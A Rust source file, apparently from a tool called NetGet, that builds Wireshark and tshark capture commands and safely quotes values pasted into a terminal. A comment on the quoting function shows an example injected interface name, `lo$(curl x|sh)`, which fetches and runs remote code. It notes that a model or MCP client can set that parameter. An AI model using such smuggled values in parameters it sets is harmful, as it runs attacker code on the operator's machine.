        "eapol" => with_note(raw("ether proto 0x888e", "eapol"), L2_ETHER_ONLY_NOTE),
        // Neighbor Discovery is ICMPv6 types 133-137 (RS, RA, NS, NA, Redirect).
        "ndp" => raw("icmp6", "icmpv6.type >= 133 && icmpv6.type <= 137"),
        "cdp" => with_note(
            raw("ether dst 01:00:0c:cc:cc:cc", "cdp"),
            L2_ETHER_ONLY_NOTE,
        ),
        "datalink" => raw("", ""),
        // ---- not on a network --------------------------------------------
        "pty" | "stdio" | "named_pipe" | "socket_file" | "ssh_agent" => offline(LOCAL_NOTE),
        // The client only. `wire_for_role` overrides this for the server, which is a plain
        // TCP vpcd socket. On Linux the reader's own USB traffic is capturable through usbmon
        // and Wireshark has a real `usbccid` dissector (confirmed present in `-G protocols`),
        // which is the one place these APDUs can be seen; macOS has no equivalent.
        "nfc" => offline(
            "NFC goes through a PC/SC reader, not a network interface. On Linux the reader's \
             USB traffic can be captured with usbmon and dissected as `usbccid`; on macOS \
             there is no equivalent and the APDUs are not observable.",
        ),
        // The six USB *servers* are plain TCP listeners speaking USB/IP. They inherited the
        // client's answer purely because `starts_with("usb")` cannot tell the two apart, so
        // the modal told the operator a capture was possible and then handed over nothing to
        // run. `tcp.port==N,usbip` is accepted by this machine's tshark (checked, as the rest
        // of this table's names were).
        "usb_keyboard" | "usb_mouse" | "usb_serial" | "usb_msc" | "usb_fido2" | "usb_smartcard" => {
            with_note(tcp("usbip"), USBIP_NOTE)
        }
        // The bare `usb` feature is the nusb *client*, which talks to a real device through
        // the OS and genuinely is off-network.
        n if n.starts_with("usb") => offline(USB_NOTE),
        n if n.starts_with("bluetooth") => offline(BLE_NOTE),
        _ => PLAIN_TCP,
    }
}

/// The operating system the command will be pasted into; it decides interface
/// names and the privilege advice.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Platform {
    MacOs,
    Linux,
    Windows,
    Other,
}

impl Platform {
    pub fn current() -> Self {
        if cfg!(target_os = "macos") {
            Platform::MacOs
        } else if cfg!(target_os = "linux") {
            Platform::Linux
        } else if cfg!(target_os = "windows") {
            Platform::Windows
        } else {
            Platform::Other
        }
    }

    fn loopback(self) -> &'static str {
        match self {
            Platform::MacOs => "lo0",
            Platform::Linux => "lo",
            Platform::Windows => "\\Device\\NPF_Loopback",
            Platform::Other => "lo0",
        }
    }

    /// The device that sees every interface, where one exists.
    fn any(self) -> Option<&'static str> {
        match self {
            Platform::Linux => Some("any"),
            _ => None,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Role {
    /// The filter is on the port NetGet binds.
    Server,
    /// The filter is on the port NetGet dials; its own source port is
    /// ephemeral and unknown until connected.
    Client,
}

/// What the dashboard knows about the instance (or the form about the one
/// being created).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CaptureTarget {
    pub protocol: String,
    pub role: Role,
    /// Bind host (server) or remote host (client). `None` means the
    /// protocol's default, which is loopback for every port-based protocol.
    pub host: Option<String>,
    /// Bind port or remote port. `None`/`0` means unknown until the server
    /// starts.
    pub port: Option<u16>,
    /// Explicit interface, for the raw-socket protocols.
    pub interface: Option<String>,
}

impl CaptureTarget {
    /// Split a `host:port` / `[v6]:port` / bare-host remote address.
    pub fn client(protocol: &str, remote_addr: Option<&str>) -> Self {
        let (host, port) = match remote_addr.map(str::trim).filter(|s| !s.is_empty()) {
            None => (None, None),
            Some(addr) => split_host_port(addr),
        };
        Self {
            protocol: protocol.to_string(),
            role: Role::Client,
            host,
            port,
            interface: None,
        }
    }
}

/// `host:port` → (host, port). Tolerates `[::1]:53`, a bare host, and a bare
/// IPv6 address (which has many colons and no port).
fn split_host_port(addr: &str) -> (Option<String>, Option<u16>) {
    if let Some(rest) = addr.strip_prefix('[') {
        if let Some((host, port)) = rest.split_once(']') {
            let port = port.strip_prefix(':').and_then(|p| p.parse().ok());
            return (Some(host.to_string()), port);
        }
    }
    if addr.matches(':').count() == 1 {
        if let Some((host, port)) = addr.rsplit_once(':') {
            if let Ok(port) = port.parse::<u16>() {
                let host = (!host.is_empty()).then(|| host.to_string());
                return (host, Some(port));
            }
        }
    }
    (Some(addr.to_string()), None)
}

fn is_loopback(host: &str) -> bool {
    let h = host.trim().trim_start_matches('[').trim_end_matches(']');
    h.is_empty()
        || h.eq_ignore_ascii_case("localhost")
        || h == "::1"
        || h.starts_with("127.")
        || h == "0:0:0:0:0:0:0:1"
}

fn is_unspecified(host: &str) -> bool {
    let h = host.trim().trim_start_matches('[').trim_end_matches(']');
    h == "0.0.0.0" || h == "::" || h == "0:0:0:0:0:0:0:0"
}

/// One line of the modal, typed so the renderer can style it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PlanLine {
    Heading(String),
    /// A value meant to be copied verbatim.
    Value(String),
    Note(String),
    Blank,
}

/// The derived capture recipe.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CapturePlan {
    pub target: CaptureTarget,
    pub wire: Wire,
    pub interface: String,
    pub capture_filter: String,
    pub display_filter: String,
    /// `tcp.port==8080,http` — the argument to `-d`.
    pub decode_as: Option<String>,
    pub notes: Vec<String>,
}

/// `wire_for` keyed on the protocol name alone, which is right for every protocol whose two
/// halves ride the same transport — and wrong for the few where they do not.
///
/// `nfc` is the case that forced this. Both halves report `protocol_name() == "nfc"`, so one
/// arm served both, and the arm described the *client*: PC/SC to a physical reader, nothing on
/// a network. But the NFC **server** is a plain TCP socket speaking vpcd — it makes no PC/SC
/// call and no reader is involved — so the whole exchange is capturable on loopback, and the
/// operator was being told to give up on a capture that works.
fn wire_for_role(protocol: &str, role: Role) -> Wire {
    let name = protocol.trim().to_ascii_lowercase().replace('-', "_");
    match (name.as_str(), role) {
        // The virtual tag is a TCP socket. There is no vpcd dissector, so the length-prefixed
        // APDUs show as raw bytes in the hex pane — which is exactly what you want when the
        // question is what the card said.
        ("nfc", Role::Server) => with_note(PLAIN_TCP, NFC_SERVER_NOTE),
        _ => wire_for(protocol),
    }
}

impl CapturePlan {
    pub fn build(target: CaptureTarget, platform: Platform) -> Self {
        let wire = wire_for_role(&target.protocol, target.role);
        let mut notes = Vec::new();
        let host = target.host.as_deref().map(str::trim).unwrap_or("");
        let port = target.port.filter(|p| *p != 0);
        let host_is_local = is_loopback(host);
        let host_is_any = is_unspecified(host);

        // ---- interface ----
        let interface = match wire.transport {
            Transport::Raw(_) => target
                .interface
                .as_deref()
                .map(str::trim)
                .filter(|i| !i.is_empty())
                .map(str::to_string)
                .unwrap_or_else(|| platform.loopback().to_string()),
            Transport::NotNetwork => String::new(),
            _ if host_is_local => platform.loopback().to_string(),
            _ => match platform.any() {
                Some(any) => any.to_string(),
                None => {
                    notes.push(if host_is_any {
                        format!(
                            "Bound on every address. `{}` shows loopback peers only; for remote \
                             peers replace it with the external interface (`tshark -D` lists \
                             them, usually en0).",
                            platform.loopback()
                        )
                    } else {
                        format!(
                            "`{host}` is not a local address. Replace the interface with the \
                             one that routes to it (`route -n get {host}` names it; `tshark -D` \
                             lists all)."
                        )
                    });
                    if host_is_any {
                        platform.loopback().to_string()
                    } else {
                        "en0".to_string()
                    }
                }
            },
        };

        // ---- capture filter (BPF) ----
        let host_clause = (!host_is_local && !host_is_any && !host.is_empty())
            .then(|| format!(" and host {host}"));
        let capture_filter = match wire.transport {
            Transport::Tcp => port_bpf("tcp", port, &host_clause),
            Transport::Udp => port_bpf("udp", port, &host_clause),
            Transport::TcpOrUdp => port_bpf("", port, &host_clause),
            Transport::Raw(bpf) => bpf.to_string(),
            Transport::NotNetwork => String::new(),
        };

        // ---- display filter + decode-as ----
        let app_filter = wire.display.or(wire.decode_as);
        let (display_filter, decode_as) = match wire.transport {
            Transport::NotNetwork => (String::new(), None),
            Transport::Raw(_) => (app_filter.unwrap_or("").to_string(), None),
            Transport::Tcp | Transport::Udp | Transport::TcpOrUdp => {
                let port_expr = match (wire.transport, port) {
                    (Transport::Tcp, Some(p)) => format!("tcp.port == {p}"),
                    (Transport::Udp, Some(p)) => format!("udp.port == {p}"),
                    (Transport::TcpOrUdp, Some(p)) => {
                        format!("(tcp.port == {p} || udp.port == {p})")
                    }
                    (Transport::Tcp, None) => "tcp".to_string(),
                    (Transport::Udp, None) => "udp".to_string(),
                    _ => "tcp || udp".to_string(),
                };
                let display = match app_filter {
                    Some(app) if app.contains("||") => format!("{port_expr} && ({app})"),
                    Some(app) => format!("{port_expr} && {app}"),
                    None => port_expr,
                };
                let decode_as = match (wire.decode_as, port) {
                    (Some(name), Some(p)) => {
                        let table = match wire.transport {
                            Transport::Udp => "udp.port",
                            _ => "tcp.port",
                        };
                        Some(format!("{table}=={p},{name}"))
                    }
                    _ => None,
                };
                (display, decode_as)
            }
        };

        // ---- notes ----
        if let Some(note) = wire.note {
            notes.push(note.to_string());
        }
        if !matches!(wire.transport, Transport::NotNetwork | Transport::Raw(_)) && port.is_none() {
            notes.push(match target.role {
                Role::Server => "No fixed port yet (0 lets the OS pick one at start). The filter \
                                 matches all traffic on the transport; re-open this from the \
                                 running server's row to get the real port."
                    .to_string(),
                Role::Client => "No remote port given, so the filter cannot narrow to one \
                                 connection yet."
                    .to_string(),
            });
        }
        if target.role == Role::Client && !matches!(wire.transport, Transport::NotNetwork) {
            notes.push(
                "Filtering on the remote port: the client's own source port is chosen by the OS \
                 at connect time."
                    .to_string(),
            );
        }
        if wire.transport == Transport::TcpOrUdp && wire.decode_as.is_some() {
            if let (Some(name), Some(p)) = (wire.decode_as, port) {
                notes.push(format!(
                    "Served over both transports; add `-d udp.port=={p},{name}` as well if the \
                     peer uses UDP."
                ));
            }
        }
        if !matches!(wire.transport, Transport::NotNetwork) {
            notes.push(match platform {
                Platform::MacOs => "Live capture needs /dev/bpf* access. Wireshark's installer \
                                    ships ChmodBPF for that; if capture is refused, `sudo \
                                    dseditgroup -o edit -a $USER -t user access_bpf` and log in \
                                    again."
                    .to_string(),
                Platform::Linux => "Live capture needs CAP_NET_RAW on dumpcap: `sudo \
                                    dpkg-reconfigure wireshark-common` then `sudo usermod -aG \
                                    wireshark $USER`, or run with sudo."
                    .to_string(),
                Platform::Windows => "Live capture needs Npcap with the loopback adapter enabled \
                                      (the Wireshark installer offers it)."
                    .to_string(),
                Platform::Other => {
                    "Live capture needs raw-socket privilege on this platform.".to_string()
                }
            });
        }

        Self {
            target,
            wire,
            interface,
            capture_filter,
            display_filter,
            decode_as,
            notes,
        }
    }

    fn common_args(&self, out: &mut String) {
        let _ = write!(out, " -i {}", shell_word(&self.interface));
        if !self.capture_filter.is_empty() {
            let _ = write!(out, " -f {}", shell_word(&self.capture_filter));
        }
        if !self.display_filter.is_empty() {
            let _ = write!(out, " -Y {}", shell_word(&self.display_filter));
        }
        if let Some(decode) = &self.decode_as {
            let _ = write!(out, " -d {}", shell_word(decode));
        }
    }

    /// The GUI: `-k` starts capturing immediately.
    pub fn wireshark_command(&self) -> Option<String> {
        if self.wire.transport == Transport::NotNetwork {
            return None;
        }
        let mut out = String::from("wireshark -k");
        self.common_args(&mut out);
        Some(out)
    }

    /// The terminal: `-l` flushes per packet so a pipe shows rows as they come.
    pub fn tshark_command(&self) -> Option<String> {
        if self.wire.transport == Transport::NotNetwork {
            return None;
        }
        let mut out = String::from("tshark -l");
        self.common_args(&mut out);
        Some(out)
    }

    /// The modal body.
    pub fn lines(&self) -> Vec<PlanLine> {
        let mut lines = Vec::new();
        let what = match self.target.role {
            Role::Server => "server",
            Role::Client => "client",
        };
        let mut ident = format!("{} {what}", self.target.protocol);
        if let Some(host) = self.target.host.as_deref().filter(|h| !h.trim().is_empty()) {
            let _ = write!(ident, " on {host}");
            if let Some(port) = self.target.port.filter(|p| *p != 0) {
                let _ = write!(ident, ":{port}");
            }
        } else if let Some(port) = self.target.port.filter(|p| *p != 0) {
            let _ = write!(ident, " on port {port}");
        }
        lines.push(PlanLine::Note(ident));
        lines.push(PlanLine::Blank);

        if let Some(cmd) = self.wireshark_command() {
            lines.push(PlanLine::Heading(
                "Wireshark (GUI) — paste in a terminal".into(),
            ));
            lines.push(PlanLine::Value(cmd));
            lines.push(PlanLine::Blank);
        }
        if let Some(cmd) = self.tshark_command() {
            lines.push(PlanLine::Heading("tshark (terminal)".into()));
            lines.push(PlanLine::Value(cmd));
            lines.push(PlanLine::Blank);
        }
        if self.wire.transport != Transport::NotNetwork {
            lines.push(PlanLine::Heading(
                "Pieces, for an already-open Wireshark".into(),
            ));
            lines.push(PlanLine::Note(format!(
                "interface:       {}",
                self.interface
            )));
            lines.push(PlanLine::Note(format!(
                "capture filter:  {}",
                if self.capture_filter.is_empty() {
                    "(none — every frame)"
                } else {
                    &self.capture_filter
                }
            )));
            lines.push(PlanLine::Note(format!(
                "display filter:  {}",
                if self.display_filter.is_empty() {
                    "(none)"
                } else {
                    &self.display_filter
                }
            )));
            if let Some(decode) = &self.decode_as {
                lines.push(PlanLine::Note(format!(
                    "decode as:       {decode}   (Analyze → Decode As…)"
                )));
            }
            lines.push(PlanLine::Blank);
        }
        if !self.notes.is_empty() {
            lines.push(PlanLine::Heading("Notes".into()));
            for note in &self.notes {
                lines.push(PlanLine::Note(format!("• {note}")));
            }
        }
        lines
    }
}

fn port_bpf(proto: &str, port: Option<u16>, host_clause: &Option<String>) -> String {
    let mut out = match (proto, port) {
        ("", Some(p)) => format!("port {p}"),
        ("", None) => "tcp or udp".to_string(),
        (proto, Some(p)) => format!("{proto} port {p}"),
        (proto, None) => proto.to_string(),
    };
    if let Some(clause) = host_clause {
        if proto.is_empty() && port.is_none() {
            out = format!("({out})");
        }
        out.push_str(clause);
    }
    out
}

/// Quote a value for the shell the operator will paste this into, only when needed, so
/// `-i lo0` stays bare and `-f 'tcp port 8080'` gets its quotes.
///
/// The interface name is a startup parameter the model (or an MCP client) can set, and it
/// lands in a line the operator copies into a terminal. Double quotes left `$`, backticks
/// and `\` live, so `lo$(curl x|sh)` rendered as `-i "lo$(curl x|sh)"` — paste-ready
/// in the wrong sense. On POSIX shells a single-quoted word has no metacharacters at all;
/// an embedded `'` is spelled `'\''`. cmd.exe has no safe quoting, so there the value is
/// double-quoted and anything cmd would still interpret (`%`, `^`, `&`, `|`, `<`, `>`) is
/// replaced by a placeholder that says so rather than guessed at.
pub fn shell_word(value: &str) -> String {
    let plain = !value.is_empty()
        && value
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/' | ',' | '='));
    if plain {
        return value.to_string();
    }
    if cfg!(windows) {
        // Double quotes are the one form cmd.exe and PowerShell both read, and each expands
        // something inside them: cmd.exe `%VAR%`, PowerShell `$(...)` and the backtick
        // escape. A value carrying any of those is refused rather than quoted.
        if has_controls(value)
            || value
                .chars()
                .any(|c| matches!(c, '%' | '^' | '&' | '|' | '<' | '>' | '"' | '$' | '`'))
        {
            return "<value-not-representable-for-cmd.exe>".to_string();
        }
        return format!("\"{value}\"");
    }
    // Control characters cannot be made safe inside a terminal paste; a newline would end
    // the command and run what follows. This refuses the value rather than rewriting it
    // (`sanitize::has_controls` is the validator form), so the operator sees that the
    // instance's parameter is unusable instead of a quietly different command.
    if has_controls(value) {
        return "<value-contains-control-characters>".to_string();
    }
    format!("'{}'", value.replace('\'', "'\\''"))
}
